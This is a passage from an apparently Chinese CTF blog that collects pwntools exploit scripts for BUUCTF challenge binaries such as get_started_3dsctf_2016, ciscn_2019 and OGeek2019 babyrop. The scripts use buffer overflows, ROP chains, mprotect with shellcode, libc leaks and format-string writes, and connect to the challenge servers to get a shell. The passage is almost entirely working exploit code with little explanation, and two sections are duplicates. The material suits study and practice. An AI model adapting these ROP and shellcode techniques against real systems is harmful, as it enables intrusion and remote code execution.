class="string">&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span></span><br><span class="line"><span class="comment"># %10$hhn表示向偏移为10处写入的地址空间为1字节</span></span><br><span class="line"><span class="comment"># %$hn表示写入的地址空间为2字节</span></span><br><span class="line"><span class="comment"># %$lln表示写入的地址空间为8字节 </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>)) </span><br><span class="line"><span class="comment">#这里的四个0x10是表示payloa中四个地址的数据长度,32位一个地址占4字节</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-06-get-started-3dsctf-2016-solve"><a href="#NO-06-get-started-3dsctf-2016-solve" class="headerlink" title="NO.06 get_started_3dsctf_2016_solve"></a>NO.06 get_started_3dsctf_2016_solve</h1><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#sh = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">sh =  remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-07-not-the-same-3dsctf-2016-solve"><a href="#NO-07-not-the-same-3dsctf-2016-solve" class="headerlink" title="NO.07 not_the_same_3dsctf_2016_solve"></a>NO.07 not_the_same_3dsctf_2016_solve</h1><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26723</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line">ppp = <span class="number">0x0809e3e5</span></span><br><span class="line">bss = <span class="number">0x080EC624</span></span><br><span class="line">pit_got = <span class="number">0x080EB000</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*offset + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(ppp) + p32(pit_got) + p32(<span class="number">0x1001</span>)+ p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(ppp) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x1000</span>) + p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#本地可行</span></span><br><span class="line"><span class="string">offset = 0x2d</span></span><br><span class="line"><span class="string">get_secret = 0x080489A0</span></span><br><span class="line"><span class="string">fl4g = 0x080ECA2D</span></span><br><span class="line"><span class="string">printf = 0x0804F0A0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;a&#x27;*offset + p32(get_secret)</span></span><br><span class="line"><span class="string">payload += p32(printf)+p32(1) + p32(fl4g)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-08-ciscn-2019-n-8-solve"><a href="#NO-08-ciscn-2019-n-8-solve" class="headerlink" title="NO.08 ciscn_2019_n_8_solve"></a>NO.08 ciscn_2019_n_8_solve</h1><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26718</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;\x11&#x27;</span>*<span class="number">53</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-09-pwn2solve"><a href="#NO-09-pwn2solve" class="headerlink" title="NO.09 pwn2solve"></a>NO.09 pwn2solve</h1><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0601060</span></span><br><span class="line">rdi = <span class="number">0x0000000000400693</span></span><br><span class="line">x = <span class="number">0x00400001</span></span><br><span class="line">ret = <span class="number">0x00000000004004ae</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi) + p64(x)+ p64(x) + asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line"><span class="comment">#payload =  asm(shellcraft.sh())</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bss:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)  + p64(x)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-10-OGeek2019-babyrop-solve"><a href="#NO-10-OGeek2019-babyrop-solve" class="headerlink" title="NO.10 [OGeek2019]babyrop_solve"></a>NO.10 [OGeek2019]babyrop_solve</h1><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28661</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+ <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>* (<span class="number">0xe7</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">offset = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] + offset</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + offset</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-11-OGeek2019-babyrop-solve"><a href="#NO-11-OGeek2019-babyrop-solve" class="headerlink" title="NO.11 OGeek2019_babyrop_solve"></a>NO.11 OGeek2019_babyrop_solve</h1><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28661</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+ <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>* (<span class="number">0xe7</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">offset = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] + offset</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + offset</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-12-铁人三项-第五赛区-2018-rop-solve"><a href="#NO-12-铁人三项-第五赛区-2018-rop-solve" class="headerlink" title="NO.12 铁人三项(第五赛区)_2018_rop_solve"></a>NO.12 铁人三项(第五赛区)_2018_rop_solve</h1><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29800</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./铁人三项(第五赛区)_2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;铁人三项(第五赛区)_2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_addr=elf.symbols[<span class="string">&#x27;__bss_start&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">        payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">0x1</span>)+p32(address)+p32(<span class="number">0x4</span>)</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        leak_address=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_address</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">&#x27;铁人三项(第五赛区)_2018_rop&#x27;</span>))</span><br><span class="line">sys_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(read_plt)+p32(main_addr)+p32(<span class="number">0x0</span>)+p32(bss_addr)+p32(<span class="number">0x8</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-13-bjdctf-2020-babyrop-solve"><a href="#NO-13-bjdctf-2020-babyrop-solve" class="headerlink" title="NO.13 bjdctf_2020_babyrop_solve"></a>NO.13 bjdctf_2020_babyrop_solve</h1><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26680</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line">junk = <span class="number">32</span></span><br><span class="line">popr = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_plt = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">read_got = elf.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x04006AD</span></span><br><span class="line">start_addr = <span class="number">0x400530</span></span><br><span class="line">payload = junk*<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;BBBBBBBB&#x27;</span>+p64(popr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">sys_addr = offset+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = offset+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = junk*<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;BBBBBBBB&#x27;</span>+p64(popr)+p64(binsh_addr)+p64(sys_addr)+p64(start_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-14-ciscn-2019-c-1-solve"><a href="#NO-14-ciscn-2019-c-1-solve" class="headerlink" title="NO.14 ciscn_2019_c_1_solve"></a>NO.14 ciscn_2019_c_1_solve</h1><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28138</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">pad</span>):</span></span><br><span class="line">    <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">    p.sendline(pad)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x50</span>+<span class="number">8</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x0400B28</span></span><br><span class="line"></span><br><span class="line">__libc_start_main_got_addr = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_addr) </span><br><span class="line">payload += p64(__libc_start_main_got_addr) </span><br><span class="line">payload += p64(puts_plt_addr) </span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line"><span 